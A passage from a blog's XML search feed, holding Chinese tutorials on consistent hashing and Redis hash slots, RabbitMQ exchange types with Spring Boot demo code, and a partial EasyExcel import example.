            <tag> Eureka </tag>
            
            <tag> 注册中心 </tag>
            
            <tag> spring cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一致性哈希与哈希槽</title>
      <link href="/2021/04/01/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%E4%B8%8E%E5%93%88%E5%B8%8C%E6%A7%BD/"/>
      <url>/2021/04/01/%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C%E4%B8%8E%E5%93%88%E5%B8%8C%E6%A7%BD/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着缓存技术出现，分布式存储的缓存集群无疑极大的提升了数据访问速度。但缓存该按照什么规定去存储到指定的节点(集群中的某个缓存服务器),新增或删除某几台缓存服务器后对以前的缓存的查找怎么办，如何处理。以下以redis非关系型内存数据库为例。</p><h3 id="缓存集群分配节点问题"><a href="#缓存集群分配节点问题" class="headerlink" title="缓存集群分配节点问题"></a>缓存集群分配节点问题</h3><p>一台或多台应用服务器的数据放入多台redis缓存服务器中时如何选择存到哪台缓存服务器，如何让数据尽可能均衡的存储数据做到负载均衡？</p><h3 id="新增删除缓存服务器影响缓存查找问题"><a href="#新增删除缓存服务器影响缓存查找问题" class="headerlink" title="新增删除缓存服务器影响缓存查找问题"></a>新增删除缓存服务器影响缓存查找问题</h3><p>如果现有的缓存服务器容量不够，新增缓存服务器如何较低风险的处理应用服务器对以前缓存数据的查找，避免新增缓存服务器时查找以前缓存服务器地址出错。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="余数算法"><a href="#余数算法" class="headerlink" title="余数算法"></a>余数算法</h3><p>提到分配自然而然地想到可以通过对要存储的key(redis K-V)值 hash后对服务器数量求余数，然后根据余数分配到指定缓存服务器。如下图：<br><img src="/img/Redis/hash.png" alt="余数算法"><br>问题：如何保证缓存的负载均衡？新增后余数算法得到的缓存服务器地址结果和以前不一致导致的大量缓存失效问题进而带来的缓存雪崩问题。如下图：<br><img src="/img/Redis/hash2.png" alt="余数算法问题"></p><h3 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h3><p>采用一致性哈希可以避免大量的缓存失效，将hash空间想象成一个圆，用各服务器的IP或者hostname进行hash算法求hashcode(在2^32之内，java hashcode为int类型32位，4个字节)，对于要缓存的数据或要查找的数据再根据对key的hash值顺时针找到的第一台服务器位缓存服务器。如下图:<br><img src="/img/Redis/一致性hash.png" alt="一致性hash"><br>新增服务器时，可以发现影响的缓存只有新增的服务器到新增服务器逆时针最近一台服务器之间的缓存受到影响，，不会导致大面积缓存失效。<br><img src="/img/Redis/一致性hash2.png" alt="一致性hash"><br>一致性hash实习负载均衡，通过将一台缓存服务器看作多台缓存服务器进行hash后映射到hash空间圆圈上<br><img src="/img/Redis/一致性hash3.png" alt="一致性hash"></p><h3 id="哈希槽"><a href="#哈希槽" class="headerlink" title="哈希槽"></a>哈希槽</h3><p> Redis Cluster(集群)在设计中没有使用一致性哈希（Consistency Hashing），而是使用数据分片引入哈希槽（hash slot）来实现一个 Redis Cluster包含16384（0~16383）个哈希槽，存储在Redis Cluster中的所有键都会被映射到这些slot中，集群中的每个键都属于这16384个哈希槽中的一个，集群使用公式slot=CRC16（key）/16384来计算key属于哪个槽，其中CRC16(key)算法语句用于计算key的CRC16 校验和。<br> 按照槽来进行分片，通过为每个节点指派不同数量的槽，可以控制不同节点负责的数据量和请求数<br><img src="/img/Redis/hashsolt.png" alt="hashsolt"><br> 新增服务器hash槽重新分配<br><img src="/img/Redis/hashsolt2.png" alt="hashsolt"></p><h4 id="哈希槽补充："><a href="#哈希槽补充：" class="headerlink" title="哈希槽补充："></a>哈希槽补充：</h4><p>哈希槽为什么是16384（2^14）个？<br>在redis节点发送心跳包时需要把所有的槽放到这个心跳包里，以便让节点知道当前集群信息，16384=16k，在发送心跳包时使用char进行bitmap压缩后是2k（2 <em> 8 (8 bit) </em> 1024(1k) = 16K），也就是说使用2k的空间创建了16k的槽数。</p><p>虽然使用CRC16算法最多可以分配65535（2^16-1）个槽位，65535=65k，压缩后就是8k（8 <em> 8 (8 bit) </em> 1024(1k) =65K），也就是说需要需要8k的心跳包，作者认为这样做不太值得；并且一般情况下一个redis集群不会有超过1000个master节点，所以16k的槽位是个比较合适的选择。</p>]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
          <category> cache </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ的4种广播类型与DEMO</title>
      <link href="/2021/03/01/RabbitMQ%E7%9A%844%E7%A7%8D%E5%B9%BF%E6%92%AD%E7%B1%BB%E5%9E%8B/"/>
      <url>/2021/03/01/RabbitMQ%E7%9A%844%E7%A7%8D%E5%B9%BF%E6%92%AD%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="rabbitmq管理界面"><a href="#rabbitmq管理界面" class="headerlink" title="rabbitmq管理界面"></a>rabbitmq管理界面</h2><p>可见我的上篇文章介绍的rabbitMQ基础与docker安装rabbitMQ management<br>网址输入：<a href="http://127.0.0.1:15672/" target="_blank" rel="noopener">http://127.0.0.1:15672/</a><br>登录名&amp;密码：guest<br><img src="/img/MQ/rabbitmq_2.png" alt="rabbitmq管理界面"></p><h2 id="1-直接模式Direct"><a href="#1-直接模式Direct" class="headerlink" title="1.直接模式Direct"></a>1.直接模式Direct</h2><h3 id="直接模式介绍"><a href="#直接模式介绍" class="headerlink" title="直接模式介绍"></a>直接模式介绍</h3><p>rabbitMQ直接模式:<br>最基础最简单的模式，发送方把消息发送给订阅方，如果有多个订阅者，默认采取轮询的方式进行消息发送。<br>当我们需要将消息发给唯一一个节点时使用这种模式，这是简单的一种形式。<br><img src="/img/MQ/rabbitmq_5.png" alt="直接模式"><br>任何发送到Direct Exchange的消息都会被转发到RouteKey中指定的Queue。 1.一般情况可以使用rabbitMQ自带的Exchange：””(该Exchange的名字为空字符串，下 文称其为default Exchange)。 2.这种模式下不需要将Exchange进行任何绑定(binding)操作 3.消息传递时需要一个“RouteKey”，可以简单的理解为要发送到的队列名字。 4.如果vhost中不存在RouteKey中指定的队列名，则该消息会被抛弃。</p><h3 id="直接模式demo代码"><a href="#直接模式demo代码" class="headerlink" title="直接模式demo代码"></a>直接模式demo代码</h3><p>添加队列<br><img src="/img/MQ/rabbitmq_3.png" alt="添加队列"></p><p>pom.xml:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-autoconfigure<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>DirectCustomer.Class<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@RabbitListener</span>(queues = <span class="string">"rabbitMQ-direct"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirectCustomer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitHandler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMsg</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"直接模式消费消息"</span>+ msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>application.yml:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring: </span><br><span class="line">rabbitmq: </span><br><span class="line">host: 127.0.0.1</span><br></pre></td></tr></table></figure></p><p>appliction.properties:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.rabbitmq.host&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure></p><p>Test:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.rabbitmq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RunWith</span>(SpringRunner<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">SpringBootTest</span>(<span class="title">classes</span> </span>= RabbitmqApplication<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">RabbitmqApplicationTests</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">contextLoads</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RabbitTemplate rabbitTemplate;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSend</span><span class="params">()</span></span>&#123;</span><br><span class="line">        rabbitTemplate.convertAndSend(<span class="string">"rabbitMQ-direct"</span>,<span class="string">"我要红包"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行项目观察控制台<br><img src="/img/MQ/rabbitmq_4.png" alt="运行项目观察控制台"></p><h2 id="2-headers模式"><a href="#2-headers模式" class="headerlink" title="2.headers模式"></a>2.headers模式</h2><p>headers：与 direct 类似，只是性能很差，此类型几乎用不到。</p><h2 id="3-fanout分发模式"><a href="#3-fanout分发模式" class="headerlink" title="3.fanout分发模式"></a>3.fanout分发模式</h2><h3 id="fanout分发模式介绍"><a href="#fanout分发模式介绍" class="headerlink" title="fanout分发模式介绍"></a>fanout分发模式介绍</h3><p>分发模式，把消息分发给所有订阅者。<br>当我们需要将消息一次发给多个队列时，需要使用这种模式，如下图<br><img src="/img/MQ/rabbitmq_5.png" alt="分发模式"><br>任何发送到Direct Exchange的消息都会被转发到RouteKey中指定的Queue。 1.一般情况可以使用rabbitMQ自带的Exchange：””(该Exchange的名字为空字符串，下 文称其为default Exchange)。 2.这种模式下不需要将Exchange进行任何绑定(binding)操作 3.消息传递时需要一个“RouteKey”，可以简单的理解为要发送到的队列名字。 4.如果vhost中不存在RouteKey中指定的队列名，则该消息会被抛弃。</p><h3 id="分发模式demo代码"><a href="#分发模式demo代码" class="headerlink" title="分发模式demo代码"></a>分发模式demo代码</h3><p>管理界面操作:<br><img src="/img/MQ/rabbitmq_6.png" alt="运行项目观察控制台"><br><img src="/img/MQ/rabbitmq_7.png" alt="运行项目观察控制台"><br><img src="/img/MQ/rabbitmq_8.png" alt="运行项目观察控制台"><br><img src="/img/MQ/rabbitmq_9.png" alt="运行项目观察控制台"><br><img src="/img/MQ/rabbitmq_10.png" alt="运行项目观察控制台"><br>Test:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSend2</span><span class="params">()</span></span>&#123;</span><br><span class="line">       rabbitTemplate.convertAndSend(<span class="string">"rabbitmq-gzx"</span>,<span class="string">""</span>,<span class="string">"分裂模式"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>消费者代码:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.rabbitmq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@RabbitListener</span>(queues = <span class="string">"rabbitMQ-fanout1"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FanoutCustomer1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitHandler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMsg</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"分发模式1消费消息"</span>+ msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.rabbitmq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@RabbitListener</span>(queues = <span class="string">"rabbitMQ-fanout2"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FanoutCustomer2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitHandler</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMsg</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"分发模式2消费消息"</span>+ msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动测试类发送消息，观察控制台结果<br><img src="/img/MQ/rabbitmq_11.png" alt="分发模式"></p><h2 id="4-topic主题模式"><a href="#4-topic主题模式" class="headerlink" title="4.topic主题模式"></a>4.topic主题模式</h2><h3 id="主题模式介绍"><a href="#主题模式介绍" class="headerlink" title="主题模式介绍"></a>主题模式介绍</h3><p>任何发送到Topic Exchange的消息都会被转发到所有关心RouteKey中指定话题的Queue上<br><img src="/img/MQ/rabbitmq_12.png" alt="主题模式"><br>如上图所示  此类交换器使得来自不同的源头的消息可以到达一个对列，其实说的更明白一点就是模 糊匹配的意思，例如：上图中红色对列的routekey为usa.#，#代表匹配任意字符，但是 要想消息能到达此对列，usa.必须匹配后面的#好可以随意。图中usa.news usa.weather,都能找到红色队列，符号 # 匹配一个或多个词，符号 <em> 匹配不多不少一个 词。因此 usa.# 能够匹配到 usa.news.XXX ，但是 usa.</em> 只会匹配到 usa.XXX 。  注：  交换器说到底是一个名称与队列绑定的列表。当消息发布到交换器时，实际上是由你所 连接的信道，将消息路由键同交换器上绑定的列表进行比较，后路由消息。<br>任何发送到Topic Exchange的消息都会被转发到所有关心RouteKey中指定话题的 Queue上</p><p>1.这种模式较为复杂，简单来说，就是每个队列都有其关心的主题，所有的消息都带有一 个“标题”(RouteKey)，Exchange会将消息转发到所有关注主题能与RouteKey模糊匹配的 队列。</p><p>2.这种模式需要RouteKey，也许要提前绑定Exchange与Queue。</p><p>3.在进行绑定时，要提供一个该队列关心的主题，如“#.log.#”表示该队列关心所有涉及 log的消息(一个RouteKey为”MQ.log.error”的消息会被转发到该队列)。</p><p>4.“#”表示0个或若干个关键字，“”表示一个关键字。如“log.”能与“log.warn”匹配，无法 与“log.warn.timeout”匹配；但是“log.#”能与上述两者匹配。</p><p>5.同样，如果Exchange没有发现能够与RouteKey匹配的Queue，则会抛弃此消息 </p><h3 id="主题模式demo代码"><a href="#主题模式demo代码" class="headerlink" title="主题模式demo代码"></a>主题模式demo代码</h3><p>管理界面操作:<br><img src="/img/MQ/rabbitmq_13.png" alt="主题模式"><br><img src="/img/MQ/rabbitmq_14.png" alt="主题模式"></p><p>Test:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTopicSend1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    rabbitTemplate.convertAndSend(<span class="string">"rabbitmq-topic"</span>,<span class="string">"china.news"</span>,<span class="string">"主题模式消息1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTopicSend2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    rabbitTemplate.convertAndSend(<span class="string">"rabbitmq-topic"</span>,<span class="string">"chengdu.weather"</span>,<span class="string">"主题模式消息2"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTopicSend3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    rabbitTemplate.convertAndSend(<span class="string">"rabbitmq-topic"</span>,<span class="string">"usa.news"</span>,<span class="string">"主题模式消息3"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看运行结果:<br><img src="/img/MQ/rabbitmq_15.png" alt="主题模式"></p>]]></content>
      
      
      <categories>
          
          <category> rabbitmq </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue+springboot整合easyexcel</title>
      <link href="/2021/02/23/vue-springboot%E6%95%B4%E5%90%88easyexcel/"/>
      <url>/2021/02/23/vue-springboot%E6%95%B4%E5%90%88easyexcel/</url>
      
        <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近Vue+ssm开发项目的excel导入导出下载整合</p><h3 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h3><p>项目依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;easyexcel&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;!--目前最新的版本--&gt;</span><br><span class="line">    &lt;version&gt;LATEST&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="Excel录入功能"><a href="#Excel录入功能" class="headerlink" title="Excel录入功能"></a>Excel录入功能</h3><p>将excel转换为表数据</p><h4 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码:"></a>后端代码:</h4><p>mybatis-plus添加查询数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import java.text.ParseException;</span><br><span class="line">import java.text.SimpleDateFormat;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.UUID;</span><br><span class="line"></span><br><span class="line">import org.springframework.beans.BeanUtils;</span><br><span class="line"></span><br><span class="line">import com.alibaba.excel.context.AnalysisContext;</span><br><span class="line">import com.alibaba.excel.event.AnalysisEventListener;</span><br><span class="line">import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line">import com.thunisoft.bid.entity.BidInfor;</span><br><span class="line">import com.thunisoft.bid.exception.BusinessException;</span><br><span class="line">import com.thunisoft.bid.service.BidExcelService;</span><br><span class="line">import com.thunisoft.bid.vo.req.ExcelVo;</span><br><span class="line"></span><br><span class="line">public class SubjectExcelListener extends AnalysisEventListener&lt;ExcelVo&gt; &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;因为SubjectExcelListener不能交给spring进行管理，需要自己new，不能注入其他对象</span><br><span class="line">    &#x2F;&#x2F;不能实现数据库操作</span><br><span class="line">    private BidExcelService bidExcelService;</span><br><span class="line"></span><br><span class="line">    public SubjectExcelListener() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public SubjectExcelListener(BidExcelService bidExcelService) &#123;</span><br><span class="line">        this.bidExcelService &#x3D; bidExcelService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;读取excel内容，一行一行进行读取，不会读取excel中的表头数据</span><br><span class="line">    @Override</span><br><span class="line">    public void invoke(ExcelVo excelVo, AnalysisContext analysisContext) &#123;</span><br><span class="line">        if(excelVo &#x3D;&#x3D; null)&#123;</span><br><span class="line">            throw new BusinessException(20001,&quot;文件中的数据为空！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;一行一行读取，每次读取</span><br><span class="line">        &#x2F;&#x2F;  判断数据库中是否存在相同项目名称、中标公司、采购单位数据，如果不存在则添加到数据库</span><br><span class="line">        BidInfor bidInfor &#x3D; existOneSubject(bidExcelService, excelVo.getProjectName(), excelVo.getPurchaseCompany(), excelVo.getBidCompany());</span><br><span class="line">        if( bidInfor &#x3D;&#x3D; null)&#123;</span><br><span class="line">            bidInfor &#x3D; new BidInfor();</span><br><span class="line">            BeanUtils.copyProperties(excelVo, bidInfor);</span><br><span class="line">            if (bidInfor.getBusinessLabel() &#x3D;&#x3D; null) &#123;</span><br><span class="line">                bidInfor.setBusinessLabel(&quot;未定义&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                bidInfor.setBidDate(simpleDateFormat.parse(excelVo.getBidDate().replaceAll(&quot;&#x2F;&quot;, &quot;-&quot;)));</span><br><span class="line">            &#125; catch (ParseException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            bidInfor.setId(UUID.randomUUID().toString().replaceAll(&quot;-&quot;, &quot;&quot;));</span><br><span class="line">            bidInfor.setCreateDate(new Date());</span><br><span class="line">            bidExcelService.save(bidInfor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;判断避免重复添加</span><br><span class="line">    public BidInfor existOneSubject(BidExcelService bidExcelService, String subjectName, String purchaseCompany, String bidCompany)&#123;</span><br><span class="line">        QueryWrapper&lt;BidInfor&gt; BidInforQueryWrapper &#x3D; 